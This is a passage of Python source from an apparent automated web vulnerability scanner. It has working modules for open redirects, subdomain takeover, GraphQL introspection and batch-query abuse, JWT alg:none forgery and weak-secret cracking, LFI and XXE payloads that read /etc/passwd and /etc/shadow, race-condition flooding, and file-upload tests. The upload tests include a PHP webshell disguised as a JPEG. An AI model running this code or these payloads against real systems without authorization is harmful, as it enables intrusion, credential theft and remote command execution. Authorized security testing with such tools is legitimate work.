                                "location":    loc,
                                "description": f"Open Redirect via param '{param_name}' → {loc}",
                            })
                            return results
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=12) as exe:
        futs = [exe.submit(_test_redirect, u) for u in redirect_urls]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    redir_json = os.path.join(out_dir, "redirect_findings.json")
    with open(redir_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  Open Redirect findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  SUBDOMAIN TAKEOVER CHECK
# ═══════════════════════════════════════════════════════════════════════════

_TAKEOVER_FINGERPRINTS: List[tuple] = [
    # (cname_pattern, body_pattern, service, severity)
    (r"\.github\.io$",          r"There isn't a GitHub Pages site here",              "GitHub Pages",    "high"),
    (r"\.herokussl\.com$|\.herokudns\.com$", r"No such app|Heroku\s+\|",             "Heroku",          "high"),
    (r"\.s3\.amazonaws\.com$",  r"NoSuchBucket|The specified bucket does not exist",  "AWS S3",          "high"),
    (r"\.s3-website",           r"NoSuchBucket|The specified bucket does not exist",  "AWS S3 Website",  "high"),
    (r"\.cloudfront\.net$",     r"The request could not be satisfied",                "AWS CloudFront",  "medium"),
    (r"\.azurewebsites\.net$",  r"404 Web Site not found|does not exist",             "Azure Websites",  "high"),
    (r"\.azurestaticapps\.net$",r"No staging slot",                                  "Azure Static",    "medium"),
    (r"\.fastly\.net$",         r"Fastly error: unknown domain",                      "Fastly CDN",      "medium"),
    (r"\.pantheonsite\.io$",    r"The gods are wise",                                 "Pantheon",        "high"),
    (r"\.myshopify\.com$",      r"Sorry, this shop is currently unavailable",         "Shopify",         "medium"),
    (r"\.zendesk\.com$",        r"Help Center Closed",                                "Zendesk",         "medium"),
    (r"\.squarespace\.com$",    r"No Such Account",                                   "Squarespace",     "high"),
    (r"\.wordpress\.com$",      r"Do you want to register",                           "WordPress.com",   "medium"),
    (r"\.ghost\.io$",           r"The thing you were looking for is no longer here",  "Ghost",           "high"),
    (r"\.tumblr\.com$",         r"Whatever you were looking for doesn't currently",   "Tumblr",          "medium"),
    (r"\.bitbucket\.io$",       r"Repository not found",                              "Bitbucket Pages", "high"),
    (r"\.desk\.com$",           r"Please try again or try Desk.com",                  "Desk",            "medium"),
    (r"\.surveygizmo\.com$",    r"data-html-name",                                    "SurveyGizmo",     "medium"),
    (r"\.helpjuice\.com$",      r"We could not find what you're looking for",         "Helpjuice",       "medium"),
    (r"\.helpscoutdocs\.com$",  r"No settings were found for this company",           "HelpScout",       "medium"),
    (r"\.cargo\.site$|\.cargocollective\.com$", r"If you're moving your domain away", "Cargo",           "medium"),
    (r"\.feedpress\.me$",       r"The feed has not been found",                       "Feedpress",       "medium"),
    (r"\.statuspage\.io$",      r"You are being redirected",                          "StatusPage",      "medium"),
    (r"\.ngrok\.io$",           r"Tunnel .* not found",                               "Ngrok",           "medium"),
    (r"\.netlify\.app$",        r"Not Found - Request ID",                            "Netlify",         "medium"),
    (r"\.vercel\.app$",         r"DEPLOYMENT_NOT_FOUND|This deployment",              "Vercel",          "medium"),
    (r"\.surge\.sh$",           r"project not found",                                 "Surge.sh",        "high"),
    (r"\.unbouncepages\.com$",  r"The requested URL was not found",                   "Unbounce",        "medium"),
    (r"\.launchrock\.com$",     r"It looks like you may have taken a wrong turn",     "Launchrock",      "medium"),
    (r"\.readme\.io$",          r"Project doesnt exist",                              "Readme.io",       "medium"),
]


def run_takeover_check(
    subdomains_file: str,
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Subdomain takeover detection:
    1. DNS CNAME resolution for each subdomain
    2. Match CNAME against known vulnerable service fingerprints
    3. Fetch body and confirm with content fingerprint
    4. Also check with nuclei takeover templates if available
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[Takeover] Checking subdomain takeover opportunities", Colors.MAGENTA + Colors.BOLD))

    import socket

    subdomains = read_lines(subdomains_file)
    # Include alive hosts too for CNAME check
    alive_hosts = extract_urls_from_httpx_output(alive_file)
    alive_domains = set()
    for u in alive_hosts:
        p = urllib.parse.urlparse(u)
        alive_domains.add(p.netloc.split(":")[0])

    all_domains = list(set(subdomains + list(alive_domains)))[:200]
    if not all_domains:
        logger.info("  No subdomains to check for takeover")
        return []

    logger.info(f"  Checking {len(all_domains)} domains for takeover")

    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    timeout_req  = min(int(config.get("timeout", 10)), 8)

    import concurrent.futures as _cf

    def _check_domain(domain: str) -> Optional[dict]:
        # DNS CNAME resolution
        cname = None
        try:
            answers = socket.getaddrinfo(domain, None)
            # Try to resolve CNAME via subprocess
            result = subprocess.run(
                ["dig", "+short", "CNAME", domain],
                capture_output=True, text=True, timeout=5,
            )
            cname = result.stdout.strip().rstrip(".").lower()
        except Exception:
            pass

        if not cname:
            return None

        # Match CNAME against fingerprints
        for cname_re, body_re, service, severity in _TAKEOVER_FINGERPRINTS:
            if re.search(cname_re, cname, re.I):
                # CNAME matches a potentially vulnerable service — check body
                for scheme in ["https", "http"]:
                    url = f"{scheme}://{domain}"
                    try:
                        resp = requests.get(
                            url, headers=base_headers,
                            timeout=timeout_req, verify=False, allow_redirects=True,
                        )
                        if re.search(body_re, resp.text, re.I):
                            return {
                                "type":        "subdomain-takeover",
                                "severity":    severity,
                                "url":         url,
                                "domain":      domain,
                                "cname":       cname,
                                "service":     service,
                                "description": f"Subdomain takeover via {service}: {domain} → {cname} (unclaimed)",
                                "body_match":  re.search(body_re, resp.text, re.I).group(0)[:80],
                            }
                    except Exception:
                        pass
        return None

    with _cf.ThreadPoolExecutor(max_workers=20) as exe:
        futs = [exe.submit(_check_domain, d) for d in all_domains]
        for fut in _cf.as_completed(futs):
            result = fut.result()
            if result:
                findings.append(result)
                logger.warning(f"  TAKEOVER: {result['domain']} → {result['service']}")

    # Also try nuclei takeover templates if available
    tool = _tool_path("nuclei", config)
    if tool and not findings:
        nuclei_out = os.path.join(out_dir, "takeover_nuclei.json")
        run_command([
            tool, "-l", alive_file,
            "-t", "takeovers/",
            "-severity", "medium,high,critical",
            "-jsonl", "-o", nuclei_out,
            "-silent", "-no-color", "-timeout", "15",
        ], timeout=300, logger=logger)
        for f in parse_nuclei_json(nuclei_out):
            f["type"] = "subdomain-takeover"
            findings.append(f)

    takeover_json = os.path.join(out_dir, "takeover_findings.json")
    with open(takeover_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  Takeover findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  GRAPHQL ENDPOINT DISCOVERY & TESTING
# ═══════════════════════════════════════════════════════════════════════════

_GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/graphiql", "/playground",
    "/api/v1/graphql", "/api/v2/graphql", "/api/v3/graphql",
    "/v1/graphql", "/v2/graphql", "/query", "/api/query",
    "/graph", "/api/graph", "/data", "/api/data",
    "/graphql/console", "/graphql/playground", "/graphql/v1",
    "/gql", "/api/gql", "/graphql/v2", "/api/explorer",
    "/hasura/v1/graphql", "/api/hasura/v1/graphql",
]

_INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}types{name kind description fields{name description type{name kind ofType{name kind}}args{name description type{name kind ofType{name kind}}}}}}}"}'


def run_graphql_discovery(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Discover GraphQL endpoints and test for introspection + vulnerabilities."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[GraphQL] Discovering and testing GraphQL endpoints", Colors.MAGENTA + Colors.BOLD))

    hosts = extract_urls_from_httpx_output(alive_file)
    if not hosts:
        hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    hosts = list(set(h.rstrip("/") for h in hosts))[:60]

    findings: List[dict] = []
    gql_endpoints: List[str] = []
    base_headers  = {
        "User-Agent":   "Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Type": "application/json",
        "Accept":       "application/json",
    }
    auth_cookie = config.get("auth_cookie", "")
    auth_header = config.get("auth_header", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    if auth_header:
        base_headers["Authorization"] = auth_header
    timeout = min(int(config.get("timeout", 10)), 8)

    import concurrent.futures as _cf

    def _probe_graphql(host: str) -> List[dict]:
        results = []
        parsed  = urllib.parse.urlparse(host)
        base    = f"{parsed.scheme}://{parsed.netloc}"

        for path in _GRAPHQL_PATHS:
            url = base + path
            try:
                # POST introspection
                resp = requests.post(
                    url, data=_INTROSPECTION_QUERY,
                    headers=base_headers, timeout=timeout,
                    verify=False, allow_redirects=True,
                )
                if resp.status_code not in (200, 400):
                    continue

                content = resp.text
                if '"__schema"' in content or '"queryType"' in content:
                    finding = {
                        "type":     "graphql-introspection",
                        "severity": "medium",
                        "url":      url,
                        "description": f"GraphQL endpoint found with introspection ENABLED: {url}",
                    }
                    # Try to extract type names
                    try:
                        gql_data = json.loads(content)
                        types = gql_data.get("data", {}).get("__schema", {}).get("types", [])
                        type_names = [t["name"] for t in types if not t["name"].startswith("__")]
                        finding["types"] = type_names[:20]
                        finding["description"] += f" — {len(type_names)} types exposed: {', '.join(type_names[:5])}"
                    except Exception:
                        pass
                    results.append(finding)
                    gql_endpoints.append(url)

                elif '"errors"' in content and '"graphql"' in content.lower():
                    # GraphQL exists but introspection disabled
                    results.append({
                        "type":     "graphql-found",
                        "severity": "info",
                        "url":      url,
                        "description": f"GraphQL endpoint found (introspection disabled): {url}",
                    })
                    gql_endpoints.append(url)

            except Exception:
                pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=10) as exe:
        futs = [exe.submit(_probe_graphql, h) for h in hosts]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    # Test for batch queries (DoS potential) on confirmed endpoints
    for gql_url in gql_endpoints[:5]:
        batch_payload = '[' + ','.join(['{"query":"{__typename}"}'] * 100) + ']'
        try:
            resp = requests.post(
                gql_url, data=batch_payload,
                headers=base_headers, timeout=10,
                verify=False,
            )
            if isinstance(json.loads(resp.text), list):
                findings.append({
                    "type":     "graphql-batch",
                    "severity": "medium",
                    "url":      gql_url,
                    "description": "GraphQL batch queries enabled — DoS amplification risk",
                })
        except Exception:
            pass

    gql_json = os.path.join(out_dir, "graphql_findings.json")
    with open(gql_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  GraphQL findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  JWT VULNERABILITY TESTING
# ═══════════════════════════════════════════════════════════════════════════

_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "test", "admin", "key",
    "qwerty", "letmein", "abc123", "master", "changeme",
    "your-256-bit-secret", "your-secret-key", "super-secret",
    "jwt-secret", "secretkey", "mysecret", "token", "auth",
    "api_secret", "app_secret", "flask-secret", "django-secret",
    "rails_secret", "hmac_secret", "jwt_secret_key", "",
    "null", "undefined", "none",
]


def _decode_jwt_payload(token: str) -> Optional[dict]:
    """Decode JWT payload without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        # Pad base64 correctly
        payload = parts[1] + "==" * (4 - len(parts[1]) % 4)
        import base64
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return None


def _forge_jwt_none_alg(token: str) -> Optional[str]:
    """Forge a JWT with alg:none to test for alg:none vulnerability."""
    try:
        import base64
        parts = token.split(".")
        # New header with alg:none
        new_header = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}'
        ).rstrip(b"=").decode()
        # Keep original payload
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def run_jwt_analysis(
    alive_params_file: str,
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    JWT vulnerability testing:
    1. Detect JWTs in cookies, headers, URL params
    2. Test alg:none bypass
    3. Test weak HS256 secrets
    4. Check for expired tokens still accepted
    5. Enumerate exposed claims
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[JWT] Analyzing JWT tokens", Colors.MAGENTA + Colors.BOLD))

    jwt_re = re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{0,}')
    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    auth_cookie  = config.get("auth_cookie", "")
    auth_header  = config.get("auth_header", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    if auth_header:
        base_headers["Authorization"] = auth_header
    timeout = min(int(config.get("timeout", 10)), 8)

    collected_jwts: dict = {}  # url → token

    # Harvest JWTs from responses
    hosts = extract_urls_from_httpx_output(alive_file)[:30]
    param_urls = read_lines(alive_params_file)[:20]
    probe_urls = list(set(hosts + param_urls))

    for url in probe_urls:
        try:
            resp = requests.get(
                url, headers=base_headers,
                timeout=timeout, verify=False, allow_redirects=True,
            )
            # Check response body, Set-Cookie, Authorization header
            search_text = resp.text + " " + " ".join(
                f"{k}:{v}" for k, v in resp.headers.items()
            )
            for tok in jwt_re.findall(search_text):
                collected_jwts[url] = tok
                break
        except Exception:
            pass

    # Also look at provided auth_cookie / auth_header for JWT
    for src in [auth_cookie, auth_header]:
        for tok in jwt_re.findall(src):
            collected_jwts["provided-auth"] = tok

    if not collected_jwts:
        logger.info("  No JWTs found to analyze")
        return []

    logger.info(f"  Found {len(collected_jwts)} JWT tokens — testing...")

    for source_url, token in collected_jwts.items():
        # 1. Decode and inspect claims
        payload = _decode_jwt_payload(token)
        if payload:
            claims_finding = {
                "type":     "jwt-exposed",
                "severity": "info",
                "url":      source_url,
                "claims":   payload,
                "description": f"JWT token found — exposed claims: {list(payload.keys())}",
            }
            # Check for sensitive claims
            sensitive = [k for k in payload if k.lower() in (
                "role", "admin", "is_admin", "user_id", "uid",
                "email", "username", "scope", "permissions",
            )]
            if sensitive:
                claims_finding["severity"] = "medium"
                claims_finding["description"] += f" | SENSITIVE: {sensitive}"
            findings.append(claims_finding)

        # 2. Test alg:none
        none_token = _forge_jwt_none_alg(token)
        if none_token and source_url != "provided-auth":
            try:
                resp = requests.get(
                    source_url,
                    headers={**base_headers, "Authorization": f"Bearer {none_token}"},
                    timeout=timeout, verify=False, allow_redirects=False,
                )
                if resp.status_code in (200, 201) and "unauthorized" not in resp.text.lower():
                    findings.append({
                        "type":     "jwt-alg-none",
                        "severity": "critical",
                        "url":      source_url,
                        "token":    none_token[:60] + "...",
                        "description": "JWT alg:none vulnerability confirmed — authentication bypass!",
                    })
            except Exception:
                pass

        # 3. Test weak HS256 secrets (offline crack attempt via timing)
        try:
            header_b64 = token.split(".")[0]
            import base64
            hdr = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
            alg = hdr.get("alg", "")
            if alg in ("HS256", "HS384", "HS512"):
                import hmac
                import hashlib
                parts = token.split(".")
                message = f"{parts[0]}.{parts[1]}".encode()
                sig_b64 = parts[2] + "=="
                expected_sig = base64.urlsafe_b64decode(sig_b64)

                for secret in _JWT_WEAK_SECRETS:
                    computed = hmac.new(
                        secret.encode(), message,
                        {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
                    ).digest()
                    if computed == expected_sig:
                        findings.append({
                            "type":     "jwt-weak-secret",
                            "severity": "critical",
                            "url":      source_url,
                            "secret":   secret,
                            "algorithm": alg,
                            "description": f"JWT weak secret cracked: '{secret}' — Full token forgery possible!",
                        })
                        break
        except Exception:
            pass

    jwt_json = os.path.join(out_dir, "jwt_findings.json")
    with open(jwt_json, "w") as f:
        json.dump(findings, f, indent=2)

    high_count = sum(1 for f in findings if f.get("severity") in ("critical", "high"))
    logger.info(f"  JWT findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)} ({high_count} critical/high)")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  LFI / PATH TRAVERSAL
# ═══════════════════════════════════════════════════════════════════════════

_LFI_PAYLOADS = [
    # Unix traversal variants
    ("../../../etc/passwd",                         r"root:x:0:0|root:!:0:0"),
    ("../../../../etc/passwd",                      r"root:x:0:0"),
    ("....//....//....//etc//passwd",               r"root:x:0:0"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd",             r"root:x:0:0"),
    ("..%2f..%2f..%2fetc%2fpasswd",                 r"root:x:0:0"),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=/etc/passwd", r"cm9vdDp4"),
    ("php://filter/read=convert.base64-encode/resource=/etc/shadow", r"[A-Za-z0-9+/]{20,}"),
    ("php://input",                                 r""),
    # Linux sensitive files
    ("/etc/passwd",                                 r"root:x:0:0"),
    ("/proc/self/environ",                          r"PATH=|HOME=|USER="),
    ("/proc/version",                               r"Linux version"),
    # Windows paths
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", r"127\.0\.0\.1"),
    ("%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", r"127\.0\.0\.1"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts",  r"127\.0\.0\.1"),
]


def run_lfi_detection(
    params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Detect Local File Inclusion / Path Traversal via parameterized URLs."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[LFI] Testing for Local File Inclusion / Path Traversal", Colors.MAGENTA + Colors.BOLD))

    param_urls = read_lines(params_file)[:150]
    if not param_urls:
        logger.info("  No parameterized URLs to test for LFI")
        return []

    findings: List[dict] = []
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"}
    proxies  = _build_proxies(config)
    auth_cookie = config.get("auth_cookie", "")
    if auth_cookie:
        headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 10)), 10)

    import concurrent.futures as _cf

    def _test_lfi(url: str) -> List[dict]:
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            # Baseline response
            baseline_text = ""
            try:
                base_params = {k: v[0] for k, v in params.items()}
                base_params[param_name] = "LFI_BASELINE_XYZ123"
                br = requests.get(
                    urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(base_params))),
                    headers=headers, timeout=timeout, verify=False, allow_redirects=True,
                    proxies=proxies,
                )
                baseline_text = br.text
            except Exception:
                pass

            for payload, sig_re in _LFI_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                try:
                    resp = requests.get(
                        test_url, headers=headers, timeout=timeout,
                        verify=False, allow_redirects=True, proxies=proxies,
                    )
                    if sig_re and re.search(sig_re, resp.text):
                        # Confirm not in baseline
                        if not re.search(sig_re, baseline_text):
                            results.append({
                                "type":        "lfi",
                                "severity":    "critical",
                                "url":         test_url,
                                "param":       param_name,
                                "payload":     payload,
                                "description": f"LFI/Path Traversal via '{param_name}': file contents disclosed",
                            })
                            break
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=10) as exe:
        for fut in _cf.as_completed([exe.submit(_test_lfi, u) for u in param_urls]):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    lfi_json = os.path.join(out_dir, "lfi_findings.json")
    with open(lfi_json, "w") as f:
        json.dump(findings, f, indent=2)
    logger.info(f"  LFI findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  XXE DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def run_xxe_detection(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Detect XXE by:
    1. Probing XML-accepting endpoints (Content-Type: text/xml, application/xml)
    2. Injecting XXE payloads with local file read
    3. Checking for file content in response
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[XXE] Testing for XML External Entity injection", Colors.MAGENTA + Colors.BOLD))

    alive_hosts = extract_urls_from_httpx_output(alive_file)
    if not alive_hosts:
        alive_hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not alive_hosts:
        logger.info("  No alive hosts for XXE testing")
        return []

    findings: List[dict] = []
    proxies  = _build_proxies(config)
    timeout  = min(int(config.get("timeout", 10)), 10)
    auth_cookie = config.get("auth_cookie", "")

    # Common XML-accepting endpoints
    xml_paths = [
        "/api/xml", "/api/upload", "/upload", "/import", "/feed",
        "/rss", "/atom", "/sitemap.xml", "/xmlrpc.php",
        "/api/v1/xml", "/api/v2/xml", "/service", "/soap",
        "/api/import", "/api/parse", "/api/convert",
    ]

    xxe_payloads = [
        # Error-based XXE — Linux
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         "application/xml", r"root:x:0:0"),
        # Error-based XXE — Windows
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>',
         "application/xml", r"127\.0\.0\.1"),
        # XXE via SOAP
        ('<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>',
         "text/xml", r"root:x:0:0"),
        # PHP expect wrapper (if expect module enabled)
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
         "application/xml", r"uid=\d+\("),
    ]

    import concurrent.futures as _cf

    def _test_xxe(base_url: str, path: str) -> List[dict]:
        url = base_url.rstrip("/") + path
        results = []
        for payload, ct, sig_re in xxe_payloads:
            try:
                hdrs = {"Content-Type": ct, "User-Agent": "Mozilla/5.0"}
                if auth_cookie:
                    hdrs["Cookie"] = auth_cookie
                resp = requests.post(
                    url, data=payload, headers=hdrs,
                    timeout=timeout, verify=False, allow_redirects=False,
                    proxies=proxies,
                )
                if resp.status_code in (200, 201, 202, 500) and re.search(sig_re, resp.text):
                    results.append({
                        "type":        "xxe",
                        "severity":    "critical",
                        "url":         url,
                        "payload":     payload[:100] + "…",
                        "description": f"XXE injection at {url}: file contents returned in response",
                    })
                    break
            except Exception:
                pass
        return results

    tasks = [(h, p) for h in alive_hosts[:30] for p in xml_paths]
    with _cf.ThreadPoolExecutor(max_workers=15) as exe:
        for fut in _cf.as_completed([exe.submit(_test_xxe, h, p) for h, p in tasks]):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    xxe_json = os.path.join(out_dir, "xxe_findings.json")
    with open(xxe_json, "w") as f:
        json.dump(findings, f, indent=2)
    logger.info(f"  XXE findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  RACE CONDITION
# ═══════════════════════════════════════════════════════════════════════════

def run_race_condition(
    alive_params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Detect race conditions by firing N concurrent identical requests and looking for:
    - Duplicate resource creation (response body differs across concurrent requests)
    - Timing anomalies between requests
    - Business logic failures (e.g., coupon applied multiple times)
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[RACE] Testing for Race Condition vulnerabilities", Colors.MAGENTA + Colors.BOLD))

    param_urls = read_lines(alive_params_file)[:50]
    # Focus on high-value endpoints
    sensitive_keywords = [
        "pay", "checkout", "coupon", "discount", "redeem", "order", "purchase",
        "transfer", "withdraw", "vote", "like", "register", "signup", "apply",
        "claim", "reset", "confirm", "verify", "invite",
    ]
    race_targets = [u for u in param_urls
                    if any(kw in u.lower() for kw in sensitive_keywords)] or param_urls[:20]

    if not race_targets:
        logger.info("  No suitable targets for race condition testing")
        return []

    findings: List[dict] = []
    proxies  = _build_proxies(config)
    timeout  = min(int(config.get("timeout", 10)), 8)
    auth_cookie = config.get("auth_cookie", "")
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"}
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    N_CONCURRENT = 15  # number of simultaneous requests per target

    import concurrent.futures as _cf

    def _send_one(url: str, sess: requests.Session) -> tuple:
        try:
            t0 = time.time()
            r  = sess.get(url, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
            return r.status_code, len(r.text), r.text[:500], round(time.time()-t0, 3)
        except Exception:
            return 0, 0, "", 0.0

    def _test_race(url: str) -> Optional[dict]:
        with requests.Session() as sess:
            sess.headers.update(headers)
            # Warm-up baseline
            try:
                baseline = sess.get(url, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
                baseline_len = len(baseline.text)
            except Exception:
                return None

            # Fire N concurrent requests simultaneously
            with _cf.ThreadPoolExecutor(max_workers=N_CONCURRENT) as exe:
                futs = [exe.submit(_send_one, url, sess) for _ in range(N_CONCURRENT)]
                results = [f.result() for f in _cf.as_completed(futs)]

        statuses = [r[0] for r in results if r[0] > 0]
        lengths  = [r[1] for r in results if r[0] == 200]
        if not statuses:
            return None

        # Detect: multiple 200s with significantly different response lengths
        if len(lengths) >= 2:
            min_l, max_l = min(lengths), max(lengths)
            if max_l > 0 and (max_l - min_l) / max_l > 0.3:  # 30% variance
                return {
                    "type":        "race-condition",
                    "severity":    "high",
                    "url":         url,
                    "description": (f"Potential race condition: {N_CONCURRENT} concurrent requests "
                                    f"produced response length variance "
                                    f"{min_l}–{max_l} bytes ({int((max_l-min_l)/max_l*100)}%)"),
                }

        # Detect: first request fails, subsequent succeed (sign of resource exhausted)
        success_after_fail = (statuses[0] in (400, 422, 429) and
                               statuses.count(200) > N_CONCURRENT // 2)
        if success_after_fail:
            return {
                "type":        "race-condition",
                "severity":    "high",
                "url":         url,
                "description": (f"Potential race condition: initial request failed ({statuses[0]}) "
                                 f"but concurrent requests succeeded"),
            }
        return None

    with _cf.ThreadPoolExecutor(max_workers=5) as exe:
        for fut in _cf.as_completed([exe.submit(_test_race, u) for u in race_targets]):
            try:
                r = fut.result()
                if r:
                    findings.append(r)
                    logger.warning(f"  Potential race condition: {r['url']}")
            except Exception:
                pass

    race_json = os.path.join(out_dir, "race_findings.json")
    with open(race_json, "w") as f:
        json.dump(findings, f, indent=2)
    logger.info(f"  Race condition findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  FILE UPLOAD BYPASS
# ═══════════════════════════════════════════════════════════════════════════

_UPLOAD_PATHS = [
    "/upload", "/api/upload", "/upload.php", "/api/file", "/api/files",
    "/file/upload", "/media/upload", "/assets/upload", "/documents/upload",
    "/profile/upload", "/avatar", "/api/avatar", "/api/profile/picture",
    "/admin/upload", "/wp-admin/upload.php", "/api/attachment",
    "/import", "/api/import", "/api/documents", "/api/v1/upload",
]

# (filename, content, content_type, expected_indicator)
_UPLOAD_PAYLOADS = [
    # PHP webshell disguised as image
    ("shell.php",    b"<?php system($_GET['cmd']); ?>",
     "image/jpeg",   r"cmd|system|passthru"),
    # PHP with double extension
    ("image.php.jpg", b"<?php echo 'UPLOAD_OK'; ?>",
     "image/jpeg",   r"UPLOAD_OK"),
    # SVG with embedded JS (XSS via upload)
    ("xss.svg",
     b'<svg xmlns="http://www.w3.org/2000/svg"><script>document.write("XSS_SVG")</script></svg>',
     "image/svg+xml", r"XSS_SVG"),
    # HTML file upload
    ("page.html",    b"<html><script>alert('XSS_HTML')</script></html>",
     "text/html",    r"XSS_HTML"),
    # EICAR test — basic detection
    ("test.exe",     b"MZ",
     "application/octet-stream", r"uploaded|success|file|url|path|href"),
    # Server-side scripts disguised as innocuous types
    ("conf.asp",     b"<% Response.Write 'ASP_OK' %>",
     "text/plain",   r"ASP_OK"),
]


def run_file_upload_bypass(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Detect unrestricted file upload vulnerabilities:
    - Tests common upload endpoints with dangerous file types
    - Checks for magic-bytes bypass (MIME type spoofing)
    - Tests double-extension bypass
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[UPLOAD] Testing for File Upload vulnerabilities", Colors.MAGENTA + Colors.BOLD))

    alive_hosts = extract_urls_from_httpx_output(alive_file)
    if not alive_hosts:
        alive_hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not alive_hosts:
        logger.info("  No alive hosts for upload testing")
        return []

    findings: List[dict] = []
    proxies   = _build_proxies(config)
    timeout   = min(int(config.get("timeout", 10)), 12)
    auth_cookie = config.get("auth_cookie", "")
    headers   = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"}
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    import concurrent.futures as _cf

    def _test_upload(base_url: str, path: str) -> List[dict]:
        url = base_url.rstrip("/") + path
        results = []

        # First probe: is there an upload form / endpoint?
        try:
            probe = requests.get(url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
            # Skip 404, 501
            if probe.status_code in (404, 501):
                return []
        except Exception:
            return []

        for filename, content, ctype, sig_re in _UPLOAD_PAYLOADS:
            try:
                files = {"file": (filename, content, ctype)}
